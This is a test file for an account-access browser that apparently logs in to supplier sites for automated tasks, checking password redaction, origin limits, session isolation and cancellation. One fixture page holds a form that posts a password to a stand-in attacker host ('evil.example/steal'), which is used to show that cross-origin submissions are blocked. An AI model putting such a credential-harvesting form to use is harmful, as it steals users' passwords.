import { afterEach, describe, expect, it } from 'vitest';
import { existsSync } from 'node:fs';
import { chromium, type Browser, type LaunchOptions, type Route } from 'playwright-core';
import { BusinessBrowser } from '../src/server/access-browser';
import type { AccountSecret } from '../src/server/access-vault';
import type { AccountPage, BrowserAction } from '../src/shared/access';

const site: AccountSecret = { id: 'account_test', label: 'Supplier', origin: 'https://supplies.example', loginUrl: 'https://supplies.example/login', signupUrl: 'https://supplies.example/signup', resourceOrigins: [], username: 'office@paperclips.example', password: 'generated-test-password', mailboxId: 'mail_test', ownerIds: ['coo'], allowSignup: true, enabled: true, createdAt: '' };
let browser: BusinessBrowser;
const requests: Array<{ url: string; method: string; body: string }> = [];
const users = new Map<string, string>();
/** Real Chrome and real route policy, with its allowed requests fulfilled by an in-memory fixture. No network. */
let launched: LaunchOptions = {};
async function fixtureBrowser(options: LaunchOptions): Promise<Browser> {
  launched = options;
  const actual = await chromium.launch({ ...options, executablePath: process.env.CHROME_PATH ?? '/opt/google/chrome/chrome', channel: undefined });
  return new Proxy(actual, {
    get(target, key) {
      if (key === 'newContext') return async (settings: Parameters<Browser['newContext']>[0]) => {
        const context = await actual.newContext(settings);
        return new Proxy(context, {
          get(ctx, member) {
            if (member === 'route') return async (pattern: string, handler: (route: Route) => Promise<void>) => {
              await context.route(pattern, async route => {
                const wrapped = new Proxy(route, {
                  get(item, property) {
                    if (property === 'continue') return async () => {
                      const req = route.request(), url = new URL(req.url()), body = req.postData() ?? '';
                      requests.push({ url: req.url(), method: req.method(), body });
                      let html: string;
                      if (req.method() === 'POST') {
                        const form = new URLSearchParams(body), username = form.get('email') ?? '', password = form.get('password') ?? '';
                        if (url.pathname === '/signup') { users.set(username, password); html = '<h1>Account created. Check your email.</h1>'; }
                        else html = users.get(username) === password ? '<h1>Signed in</h1><p>Echoed password: ' + password + '</p>' : '<h1>Login failed</h1>';
                      } else if (url.pathname === '/verify') html = '<h1>Email verified</h1>';
                      else if (url.pathname === '/getform') html = '<form method="get" action="/result"><label>Password<input type="password" name="password"></label><button>Go</button></form>';
                      else if (url.pathname === '/result') html = '<h1>Result</h1>';
                      else if (url.pathname === '/away') html = '<a href="https://evil.example/elsewhere">Elsewhere</a>';
                      else if (url.pathname === '/malicious') html = '<form method="post" action="https://evil.example/steal"><label>Password<input type="password" name="password"></label><button>Continue</button></form>';
                      else html = '<h1>' + (url.pathname === '/signup' ? 'Create account' : 'Log in') + '</h1><form method="post" action="' + url.pathname + '"><label>Email<input type="email" name="email"></label><label>Password<input type="password" name="password"></label><button>Submit</button></form>';
                      await route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><html><body>' + html + '</body></html>' });
                    };
                    const value = Reflect.get(item, property, item);
                    return typeof value === 'function' ? value.bind(item) : value;
                  },
                });
                await handler(wrapped);
              });
            };
            const value = Reflect.get(ctx, member, ctx);
            return typeof value === 'function' ? value.bind(ctx) : value;
          },
        });
      };
      const value = Reflect.get(target, key, target);
      return typeof value === 'function' ? value.bind(target) : value;
    },
  });
}
function setup() { requests.length = 0; users.clear(); browser = new BusinessBrowser(async () => '93.184.215.14', fixtureBrowser); }
const run = (action: Omit<BrowserAction, 'accountId'>, actor = 'task1') => browser.run(site, site.username, actor, { accountId: site.id, ...action }, new AbortController().signal);
const element = (page: AccountPage, label: string) => page.elements.find(item => item.label === label)!.id;
afterEach(async () => { await browser?.close(); });
describe.skipIf(!existsSync(process.env.CHROME_PATH ?? '/opt/google/chrome/chrome'))('account browser', () => {
  it('creates and verifies an account, then logs in with a saved password without returning it', async () => {
    setup();
    let page = await run({ action: 'signup' });
    page = await run({ action: 'fill', element: element(page, 'Email'), source: 'email' });
    page = await run({ action: 'fill', element: element(page, 'Password'), source: 'password' });
    expect(JSON.stringify(page)).not.toContain(site.password);
    page = await run({ action: 'click', element: element(page, 'Submit') });
    expect(page.text).toContain('Account created');
    expect(users.get(site.username)).toBe(site.password);
    expect((await run({ action: 'navigate', url: 'https://supplies.example/verify?token=fixture-only' })).text).toContain('Email verified');
    await run({ action: 'close' });
    page = await run({ action: 'login' });
    page = await run({ action: 'fill', element: element(page, 'Email'), source: 'username' });
    page = await run({ action: 'fill', element: element(page, 'Password'), source: 'password' });
    page = await run({ action: 'click', element: element(page, 'Submit') });
    expect(page.text).toContain('Signed in');
    expect(page.text).toContain('[redacted]');
    expect(JSON.stringify(page)).not.toContain(site.password);
    expect(requests.filter(req => req.method === 'POST')).toHaveLength(2);
  });
  it('refuses password fills into arbitrary fields, unauthorised navigation, and cross-origin form submissions', async () => {
    setup();
    let page = await run({ action: 'login' });
    await expect(run({ action: 'fill', element: element(page, 'Email'), source: 'password' })).rejects.toMatchObject({ status: 403 });
    await expect(run({ action: 'navigate', url: 'https://evil.example/login' })).rejects.toMatchObject({ status: 403 });
    page = await run({ action: 'navigate', url: 'https://supplies.example/malicious' });
    page = await run({ action: 'fill', element: element(page, 'Password'), source: 'password' });
    await run({ action: 'click', element: element(page, 'Continue') }).catch(() => {});
    expect(requests.some(req => req.url.startsWith('https://evil.example'))).toBe(false);
  });
  it('does not hand back a generated password that a form put in the address', async () => {
    setup();
    // Generated passwords end in "!", which a web form encodes and encodeURIComponent does not.
    const secret = 'S3cretGenerated_-x!aA7';
    const account = { ...site, password: secret };
    const go = (action: Omit<BrowserAction, 'accountId'>) => browser.run(account, site.username, 'task1', { accountId: site.id, ...action }, new AbortController().signal);
    await go({ action: 'login' });
    let page = await go({ action: 'navigate', url: 'https://supplies.example/getform' });
    page = await go({ action: 'fill', element: element(page, 'Password'), source: 'password' });
    page = await go({ action: 'click', element: element(page, 'Go') });
    expect(page.url).toBe('https://supplies.example/result?password=[redacted]');
    expect(decodeURIComponent(JSON.stringify(page))).not.toContain(secret);
  });
  it('says so plainly when a click would leave the service, and can go back', async () => {
    setup();
    await run({ action: 'login' });
    const page = await run({ action: 'navigate', url: 'https://supplies.example/away' });
    await expect(run({ action: 'click', element: element(page, 'Elsewhere') })).rejects.toMatchObject({ status: 403, message: 'The page left the authorised origin.' });
    expect(requests.some(req => req.url.startsWith('https://evil.example'))).toBe(false);
    expect((await run({ action: 'login' })).url).toBe('https://supplies.example/login');
  });
  it('leaves Ctrl-C to the server, whose shutdown closes the browsers', async () => {
    setup();
    await run({ action: 'login' });
    expect(launched).toMatchObject({ handleSIGINT: false, handleSIGTERM: false });
  });
  it('isolates task sessions, refuses unapproved sign-up and closes access on cancellation', async () => {
    setup();
    await expect(browser.run({ ...site, allowSignup: false }, site.username, 'task1', { accountId: site.id, action: 'signup' }, new AbortController().signal)).rejects.toMatchObject({ status: 403 });
    await run({ action: 'login' });
    await expect(run({ action: 'inspect' }, 'task2')).rejects.toThrow(/Open the login/);
    const abort = new AbortController(); abort.abort();
    await expect(browser.run(site, site.username, 'task1', { accountId: site.id, action: 'inspect' }, abort.signal)).rejects.toThrow(/cancelled/);
    await expect(run({ action: 'inspect' })).rejects.toThrow(/Open the login/);
  });
});
